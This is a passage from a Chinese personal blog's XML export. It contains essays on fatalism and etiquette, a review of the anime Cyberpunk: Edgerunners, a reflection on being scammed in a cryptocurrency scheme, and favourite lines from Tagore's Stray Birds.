<h1 id="“浮”的大多数"><a href="#“浮”的大多数" class="headerlink" title="“浮”的大多数"></a>“浮”的大多数</h1><p>不可否认的是，大多数人都是处于“浮”的状态的，能遨游天际抑或是潜入海底的终究是少数。<br>我对人性是持悲观态度的，同时我又是宿命论的支持者，因此我对于“浮”的状态的人更多批判而更少同情。我相信有些鸟儿是注定不会被关在牢笼里的，它们的每一片羽毛都闪耀着自由的光辉。不能从“浮”的状态中脱离出的人，可能一辈子都无法脱离，命运不能改变。<br>有些人往往向往着崇高，却自由地选择卑劣。处在“浮”的状态中的人，大多数并不是不自知，而是知道了选择逃避，或许有想过挣扎，蹦跶了几次后，没有成功最终放弃。处于“浮”的状态的人，没有改变的决心。“浮”绝不是一种自由的体现，因为自由不能以彻底放弃自由为代价！<br>正如我之前的一篇文章中所写，道理充斥的时代，我们缺少觉悟。不论什么样的觉悟都可以，单纯是不想将这个世界让给讨厌的人也好，拯救苍生也好。觉悟不分贵贱，只在程度深浅。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>讨论写出的文章，时间紧迫，没做修改，凑合着看看。以后有机会再回来改~</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈礼仪的对象</title>
    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
<span id="more"></span>
<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>礼仪</tag>
      </tags>
  </entry>
  <entry>
    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
    <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p>
<p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p>
<h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p>
<p><img src="/images/Lucy3.png" alt="Lucy"></p>
<h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p>
<p><img src="/images/kiss.png" alt="kiss"></p>
<h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p>
<p><img src="/images/Lucy8.png" alt="Lucy"></p>
<h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p>
<p><img src="/images/Rebecca2.png" alt="Rebecca"></p>
<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>
无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。
大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font>

<p><img src="/images/Lucy4.png" alt="Lucy"></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p>
<p><img src="/images/Lucy2.png" alt="Lucy"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p>
<p><img src="/images/Lucy5.png" alt="Lucy"></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>赛博朋克</category>
      </categories>
      <tags>
        <tag>动画</tag>
      </tags>
  </entry>
  <entry>
    <title>骗子随想二三事</title>
    <url>/2023/03/08/%E9%AA%97%E5%AD%90%E9%9A%8F%E6%83%B3%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被骗后只懂得生气的人根本不成对手，应该要懂得佩服这种手法，才算是真正的商人。</p>
<h1 id="骗子的定义"><a href="#骗子的定义" class="headerlink" title="骗子的定义"></a>骗子的定义</h1><p>骗子这个词，是用来形容一个比较糟糕的人的说法。人活在世上，很难一次都不说谎，也不是只要说谎，我们就认为一个人是骗子，如果这样，那么恐怕世界上绝大多数人都是骗子。我想，骗子这个词，适合形容因说谎带给人比较重的伤害的人。<br>判定一个人是否为骗子，我们可以唯目的论，唯结果论。<br>所谓唯目的论，就是看一个人说谎的动机或目的是什么，如果目的或动机是为了自身利益或是损害他人，无论最终给被骗人带来了好处还是坏处，都被认为是骗子。唯结果论，就是看一个人说谎后造成的结果是好的还是坏的，如果结果给被骗人带来了坏处，无论说谎的动机或目的是什么，都被认为是骗子。<br>世界并非只有二象性，而是包罗万象，自然也不能仅仅唯目的论或是唯结果论，对于不同的人判定一个人的标准也不同。我们应该综合考虑说谎的人的意图、行为、后果和责任，以及被欺骗的人的感受、权利、利益和伤害，才能做出一个公正合理的判断。也即综合分析，折中判断，得出最具有信服力的结论。</p>
<h1 id="被骗后的态度"><a href="#被骗后的态度" class="headerlink" title="被骗后的态度"></a>被骗后的态度</h1><p>我想，被骗的人没有足够的警惕性和判断力，又或许是因为他们对自己的能力和信心过于自信。每个人都有不成熟的时候，这种不成熟可能是自身的心性不成熟，可能是自身的知识不成熟，可能是条件不成熟等等，不管怎样，不成熟的人往往容易被骗。<br>如果一个人在被骗后，只懂得生气、愤怒、咒骂等等，那么他们很难从一件事上获得更多的教训，下次遇到其他类似的事，可能又会跌倒。而懂得佩服骗子手法的人有更开放和包容的心态，有更强的学习和进步的欲望，所以在遇到骗局时能够从中吸取教训和经验。这两类人对比之下，高下立判。</p>
<p>不仅仅是被骗后的态度，说得更宽泛一点，也是面对人生中不幸事件的态度。只是停留在恼怒，停留在对一个事情表面认识的人，是不会取得成就与智慧的。我们需要透过现象看本质，彻底理解每个现象背后本质的异同。</p>
<p>拿自己曾经被骗的经历来说：有人曾对我设了一个骗局，他在匿名平台上主动找我私聊，以暴利诱惑我，将钱投入到一个新发行的虚拟货币中，投入后钱全都取不出来，最后导致全数被坑，人也消失的无影无踪。就从这个经历上，我打心里明白了“无利不起早”。一个让人掏出钱或拿出什么利益的人，背后都有自己的动机或目的，有时表面上看似不会让对方受益，或许只是自己没有抓住那条隐藏的利益链。说谎的重点不是在内容本身，而是在于为什么要说谎。并且，说谎是否有代价，这样的代价是否值得人铤而走险。如果当时是在一个实名注册的平台上或是我认识他，或许对方就不会冒这样的风险吧。正是由于在匿名平台上，说谎的代价几乎为0，骗到与否，都不会给他带来难以承受的代价，因此才敢于欺骗。最后一点是我当时对于虚拟货币还不甚了解，只是单纯贪图利益就加入了。如果我了解得多一些，知道了这种骗局的存在，也不会被骗。总的来说，就是四点：一是对人心认识不够，二是没意识到说谎的代价很低，三是对骗局内的事物不了解，四是自己的利欲熏心。</p>
<h1 id="“聪明”的骗子"><a href="#“聪明”的骗子" class="headerlink" title="“聪明”的骗子"></a>“聪明”的骗子</h1><p>一个能够完整设计出骗局并成功实施的骗子，那么至少能说明这个骗局逻辑上基本没有漏洞，较好地与某样实际的事物相结合（比如虚拟货币），能激发出人内心的贪欲，最终挑选的对象还正好合适，这些条件缺一不可。我想，从这个层面而言，骗子是比被骗的人聪明且努力的。正是因为被骗人的怠惰，给了骗子钻漏洞的机会。从来只有聪明人能设计骗局骗到蠢人，而没有反过来的。某种意义上可以说，被骗的人应当向骗子学习，不单是学习怎么防止被骗，也要学习那种努力思考的精神。否则，虽然在道德上胜过了骗子，在精神上却落后一大截。五十步笑百步，又有什么瞧不起骗子的资格呢？</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
      </tags>
  </entry>
  <entry>
    <title>飞鸟集--摘抄</title>
    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
<span id="more"></span>
<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
</ol>
<p>未完待续…</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
]]></content>
      <categories>
        <category>摘抄</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
</search>
